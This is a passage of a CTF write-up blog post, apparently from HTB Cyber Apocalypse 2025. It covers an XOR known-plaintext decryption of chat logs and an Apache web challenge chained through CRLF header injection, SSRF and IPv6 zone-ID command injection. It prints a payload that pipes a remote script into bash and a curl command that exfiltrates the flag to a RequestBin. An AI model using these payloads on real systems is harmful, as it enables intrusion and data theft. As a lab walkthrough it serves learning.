+<span class="n">decrypt</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">!nick Stormbane</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">!nick Runeblight</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">We</span><span class="se">\'</span><span class="s">ve got a new tip about the rebels. Let</span><span class="se">\'</span><span class="s">s keep our chat private.</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Understood. Has there been any sign of them regrouping since our last move?</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Not yet, but I</span><span class="se">\'</span><span class="s">m checking some unusual signals. If they sense us, we might have</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">This channel is not safe for long talks. Let</span><span class="se">\'</span><span class="s">s switch to our private room.</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Here is the passphrase for our secure channel: %mi2gvHHCV5f_kcb=Z4vULqoYJ&amp;oR</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Got it. Only share it with our most trusted allies.</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Yes. Our last move may have left traces. We must be very careful.</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">10</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">I</span><span class="se">\'</span><span class="s">m checking our logs to be sure no trace of our actions remains.</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">11</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Keep me updated. If they catch on, we</span><span class="se">\'</span><span class="s">ll have to act fast.</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">12</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">I</span><span class="se">\'</span><span class="s">ll compare the latest data with our backup plan. We must erase any sign we we</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">13</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">If everything is clear, we move to the next stage. Our goal is within reach.</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">14</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Hold on. I</span><span class="se">\'</span><span class="s">m seeing strange signals from outside. We might be watched.</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">15</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">We can</span><span class="se">\'</span><span class="s">t take any risks. Let</span><span class="se">\'</span><span class="s">s leave this channel before they track us.</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">16</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Agreed. Move all talks to the private room. Runeblight, please clear the logs h</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">17</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Understood. I</span><span class="se">\'</span><span class="s">m disconnecting now. If they have seen us, we must disappear imme</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">18</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">!leave</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">19</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">!leave</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">20</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">!leave</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Unfortunately, the secret channel is also encrypted in the same way, so we have to repeat the procedure:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ...
+</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">------------------------------------------------------------</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">msgs</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="c1"># encrypted msgs from #secret channel
+</span><span class="p">]</span>
+
+<span class="n">texts</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="sh">"</span><span class="s"> are</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sh">"</span><span class="s">uncil</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="sh">"</span><span class="s">eady be</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sh">"</span><span class="s">ies</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="sh">"</span><span class="s">in</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="sh">"</span><span class="s">hannel</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="sh">"</span><span class="s">work</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sh">"</span><span class="s">gainst us</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="sh">"</span><span class="s">n of </span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="sh">"</span><span class="s">ct soon</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="sh">"</span><span class="s">take could </span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="sh">"</span><span class="s">to </span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="sh">"</span><span class="s">m our </span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="sh">"</span><span class="s">f opportunity closes.</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sh">"</span><span class="s">ve a </span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sh">"</span><span class="s">s.</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="sh">"</span><span class="s">blem.</span><span class="sh">"</span><span class="p">),</span>
+<span class="p">]</span>
+<span class="k">for</span> <span class="n">cypher_index</span><span class="p">,</span> <span class="n">plain</span> <span class="ow">in</span> <span class="n">texts</span><span class="p">:</span>
+    <span class="n">C</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">msgs</span><span class="p">[</span><span class="n">cypher_index</span><span class="p">])</span>
+    <span class="n">C</span> <span class="o">=</span> <span class="n">C</span><span class="p">[</span><span class="nf">len</span><span class="p">(</span><span class="n">X</span><span class="p">):]</span>
+    <span class="n">M</span> <span class="o">=</span> <span class="n">plain</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
+    <span class="n">X</span> <span class="o">+=</span> <span class="nf">xor</span><span class="p">(</span><span class="n">M</span><span class="p">,</span> <span class="n">C</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">msg</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">msgs</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">decrypt[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">]:</span><span class="sh">"</span><span class="p">,</span> <span class="nf">xor</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">msg</span><span class="p">)))</span>
+</code></pre></div></div>
+
+<p>After some more time iterating on this, we finally find the flag:</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/traces-solve.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/traces-solve.png" alt="everything decrypted" /></a></figure>
+
+<h2 id="web---cyber-attack">Web - Cyber Attack</h2>
+
+<blockquote>
+  <p>Welcome, Brave Hero of Eldoria.
+You’ve entered a domain controlled by the forces of Malakar, the Dark Ruler of Eldoria.
+This is no place for the faint of heart.
+Proceed with caution: The systems here are heavily guarded, and one misstep could alert Malakar’s sentinels.
+But if you’re brave - or foolish - enough to exploit these defenses, you might just find a way to weaken his hold on this world.
+Choose your path carefully: Your actions here could bring hope to Eldoria… or doom us all.
+The shadows are watching.
+Make your move.</p>
+</blockquote>
+
+<p>We’re now given an instance of a server running on a certain IP+port, along with the full source code needed to reproduce it on a local docker environment.</p>
+
+<h3 id="web-recon">Web Recon</h3>
+
+<p>With some basic reconnaissance, we verify that the port is serving HTTP, and apparently using Apache 2.4.54 and PHP 7.4.33 to do so:</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-enum.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-enum.png" alt="basic web recon" /></a></figure>
+
+<p>The HTLM itself is a simple web form which can submit domains or IPs to a “cyber attack server” (in this case, the “attack” consists of a <code class="language-plaintext highlighter-rouge">ping -c 1 &lt;TARGET&gt;</code>).</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-web.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-web.png" alt="attacking google.com" /></a></figure>
+
+<p>The IP-based attack is only enabled if we’re launching the attack from the server’s local network.
+Looking at the page source, we can see that some part of this validation is done client-side, and we can simply edit the HTML to enable the IP attack button.
+We still get a 403 Forbidden if we try to submit to that endpoint, so it’s being blocked server side as well.</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-forbidden.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-forbidden.png" alt="forbidden endpoint" /></a></figure>
+
+<h3 id="source-analysis">Source Analysis</h3>
+
+<p>Looking at the source code now, we can see that it is indeed an Apache HTTP server, with one <a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface">CGI script</a> in PHP and other two implemented in Python.
+Every important piece of code is shown in the screenshot below:</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-source.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-source.png" alt="server source code" /></a></figure>
+
+<p>Let’s point out a few things:</p>
+<ul>
+  <li>We know that the flag will be stored in <code class="language-plaintext highlighter-rouge">/flag-&lt;random-string&gt;.txt</code></li>
+  <li>In the Apache config, we verify that the <code class="language-plaintext highlighter-rouge">/cgi-bin/attack-ip</code> endpoint is restricted and only accessible from localhost IPs</li>
+  <li>In both python CGI scripts, we see a system command being executed with a request-provided input interpolated as the <code class="language-plaintext highlighter-rouge">target</code> argument to <code class="language-plaintext highlighter-rouge">ping</code>; this should immediately jump out as an opportunity for RCE</li>
+  <li>Input validation in <code class="language-plaintext highlighter-rouge">attack-domain</code> is done with a regex, whereas in <code class="language-plaintext highlighter-rouge">attack-ip</code> it suffices that <code class="language-plaintext highlighter-rouge">ip_address(target)</code> not throw an exception</li>
+  <li>In both cases, the <code class="language-plaintext highlighter-rouge">name</code> parameter is not sanitized, and is put back in the <code class="language-plaintext highlighter-rouge">Location</code> header when <code class="language-plaintext highlighter-rouge">target</code> fails validation</li>
+</ul>
+
+<h3 id="command-injection">Command Injection</h3>
+
+<p>The regex in <code class="language-plaintext highlighter-rouge">attack-domain</code> is quite restrictive and I dont’t see a way to exploit it for command injection.
+Fortunately, after looking at <a href="https://github.com/python/cpython/blob/3.13/Lib/ipaddress.py">the source code for <code class="language-plaintext highlighter-rouge">ipaddress.ip_address()</code></a>, I found out that its IPv6 parsing can be quite permissive because it implements <a href="https://www.rfc-editor.org/rfc/rfc4007">RFC 4007</a> “scoped addresses”.
+Here’s a few tests:</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-ipaddress.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-ipaddress.png" alt="experimenting with ipaddress IPv6 parsing" /></a></figure>
+
+<p>Essentially: any valid unscoped IPv6 address can have a suffix <code class="language-plaintext highlighter-rouge">%&lt;ZONE&gt;</code>, where <code class="language-plaintext highlighter-rouge">&lt;ZONE&gt;</code> can be any string, as long as it does not contain forward slashes.
+We now know that, if we ever manage to call the <code class="language-plaintext highlighter-rouge">/cgi-bin/attack-ip</code> endpoint, we can exploit this to achieve RCE.</p>
+
+<h3 id="crlf-and-header-injection">CRLF and Header Injection</h3>
+
+<p>Looking back at <code class="language-plaintext highlighter-rouge">attack-domain</code>, I started playing with the <code class="language-plaintext highlighter-rouge">name</code> parameter and eventually found out that it could be used to inject arbitrary HTTP headers in the response if it contained sequences of CRLF bytes.
+In the screenshot below, I validate this by injecting <code class="language-plaintext highlighter-rouge">X-Injected-Header</code> and seeing it come back in the reply.</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-header.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-header.png" alt="header injection" /></a></figure>
+
+<h3 id="confusion-attacks">Confusion Attacks</h3>
+
+<p>At this point, I was stuck.
+I knew how to exploit <code class="language-plaintext highlighter-rouge">attack-ip</code> for RCE, but was denied access to it.
+In <code class="language-plaintext highlighter-rouge">attack-domain</code>, we had a header injection exploit working, but nothing else.</p>
+
+<p>Fortunately, after some googling I eventually found Orange Tsai’s Black Hat 2024 presentation, as well as his blog post / writeup, on <a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/">“Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!”</a>.
+His research shows (among other things) that an attacker who can inject arbitrary headers in an Apache HTTP response can achieve generalized SSRF (Server-Side Request Forgery).</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-confusion.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-confusion.png" alt="screenshot from Orange Tsai presentation" /></a></figure>
+
+<h3 id="ssrf-attack">SSRF Attack</h3>
+
+<p>We copied the example from his slides and checked that SSRF was working (albeit only for HTTP targets).
+In the screenshot below, we can see that we’ve tricked the server into accessing <code class="language-plaintext highlighter-rouge">http://example.com/</code> and serving that page in its response.</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-ssrf.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-ssrf.png" alt="validating SSRF exploit" /></a></figure>
+
+<p>Using this exploit, we use the remote server to trigger <code class="language-plaintext highlighter-rouge">/cgi-bin/attack-ip</code>.
+Since the proxy is in the same machine, it gets right through the restriction configured for that endpoint.</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-bypass.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-bypass.png" alt="reaching the vulnerable endpoint" /></a></figure>
+
+<h3 id="rce-and-exfiltration">RCE and Exfiltration</h3>
+
+<p>After messing around with url-encoding, we’re finally able to execute commands in the server, sending payloads such as <code class="language-plaintext highlighter-rouge">::1%$(whoami)</code> or <code class="language-plaintext highlighter-rouge">::1%$(ls)</code> in the <code class="language-plaintext highlighter-rouge">target</code> parameter of the <code class="language-plaintext highlighter-rouge">/cgi-bin/attack-ip</code> endpoint.
+Still, getting the flag required some level of trickyness, since we can’t execute any commands containing <code class="language-plaintext highlighter-rouge">/</code>.
+Furthermore, we also have no way to see the output of our commands.</p>
+
+<p>My solution to this involved hosting a script in the <code class="language-plaintext highlighter-rouge">index.html</code> page of a custom domain I have.
+With that resource being served by default on HTTP requests to <code class="language-plaintext highlighter-rouge">/</code>, and this empty path being an optional part of an URL, my final payload was <code class="language-plaintext highlighter-rouge">::1%$(curl+tmp.baioc.dev|bash)</code>.
+(NB: in Apache/PHP, the <code class="language-plaintext highlighter-rouge">+</code> character gets url-decoded to a space character).</p>
+
+<p>Meanwhile, here’s what I hosted in <code class="language-plaintext highlighter-rouge">tmp.baioc.dev/index.html</code>:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+curl <span class="s2">"http://requestbin.whapi.cloud/v5c55ev5?flag=</span><span class="si">$(</span><span class="nb">cat</span> /flag<span class="k">*</span> | <span class="nb">base64</span><span class="si">)</span><span class="s2">"</span>
+</code></pre></div></div>
+
+<p>This is reading the flag, base64-encoding it and exfiltrating the result via a request parameter to a temporary <a href="https://requestbin.whapi.cloud/">RequestBin</a>.
+The screenshot below shows the fully encoded <code class="language-plaintext highlighter-rouge">curl</code> command used to trigger the remote script.</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-rce.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-rce.png" alt="exploiting command injection to get RCE" /></a></figure>
+
+<p>And then, looking at the logs for that RequestBin, we see the base64-encoded flag arriving:</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-exfiltration.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cyber-attack-exfiltration.png" alt="flag exfiltrated successfully" /></a></figure>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#ctf" class="page__taxonomy-item p-category" rel="tag">ctf</a><span class="sep">, </span>
+    
+      <a href="/tags/#cybersecurity" class="page__taxonomy-item p-category" rel="tag">cybersecurity</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#writeup" class="page__taxonomy-item p-category" rel="tag">writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2025-03-26T00:00:00+00:00">March 26, 2025</time></p>
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/tutorial/arch-awesomewm/" class="pagination--pager" title="How to set up an X-based desktop from scratch
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    
+<div class="page__related">
+  
+  <h2 class="page__related-title">You may also enjoy</h2>
+  <div class="grid__wrapper">
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/dual-boot/arch-rice.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/tutorial/arch-awesomewm/" rel="permalink">How to set up an X-based desktop from scratch
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-07-27T00:00:00+00:00">July 27, 2024</time>
+      </span>
+    
+
+    
+
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Advanced dual-boot setup - Part 4: From TTY to graphical desktop
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/dual-boot/os-ubuntu.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/tutorial/ubuntu-lvmcache/" rel="permalink">How to set up lvmcache across LUKS-encrypted partitions
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-07-14T00:00:00+00:00">July 14, 2024</time>
+      </span>
+    
+
+    
+
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Advanced dual-boot setup - Part 3: Encrypted hybrid storage
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/dual-boot/refind.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/tutorial/arch-btrfs-luks-raid/" rel="permalink">How to install Arch on Btrfs with LUKS encryption and software RAID1
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-05-17T00:00:00+00:00">May 17, 2024</time>
+      </span>
+    
+
+    
+
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Advanced dual-boot setup - Part 2: I use Arch, btw
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/dual-boot/ubuntu-boot-encrypted.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/tutorial/ubuntu-24.04-encrypted/" rel="permalink">How to install Ubuntu 24.04 LTS with Full Disk Encryption
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-05-16T00:00:00+00:00">May 16, 2024</time>
+      </span>
+    
+
+    
+
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Advanced dual-boot setup - Part 1: Ubuntu guided installation
+</p>
+  </article>
+</div>
+
+    
+  </div>
+</div>
+
+  
+  
+</div>
+
+      
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2025 <a href="https://www.baioc.dev">Gabriel B. Sant'Anna</a></div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+  </body>
+</html>
